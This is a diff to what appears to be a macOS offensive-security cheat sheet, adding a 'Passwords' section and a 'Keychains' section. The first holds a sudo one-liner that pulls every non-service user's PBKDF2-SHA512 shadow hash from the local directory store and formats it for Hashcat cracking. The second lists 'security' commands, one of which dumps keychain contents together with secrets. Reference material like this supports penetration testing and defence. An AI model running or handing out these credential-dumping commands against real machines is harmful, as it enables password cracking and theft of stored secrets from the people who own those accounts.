@@ -105,6 +105,36 @@ dscl . read /Groups/[group]
 dsconfigad -show
 ```
 
+### Passwords
+
+The following one-liner which will dump credentials of all non-service accounts in Hashcat format `-m 7100` (`macOS PBKDF2-SHA512`):
+
+```sh
+sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
+```
+
+### Keychains
+
+```sh
+# List certificates
+security dump-trust-settings [-s] [-d]
+
+# List keychain databases
+security list-keychains
+
+# List smartcards
+security list-smartcards
+
+# List keychains entries
+security dump-keychain | grep -A 5 "keychain" | grep -v "version"
+
+# Dump all the keychain information, included secrets
+security dump-keychain -d
+```
+
+> [!TIP]
+> The last command will prompt the user for their password each entry, even if root. This is **extremely** noisy
+
 ### Network Services
 
 ```sh
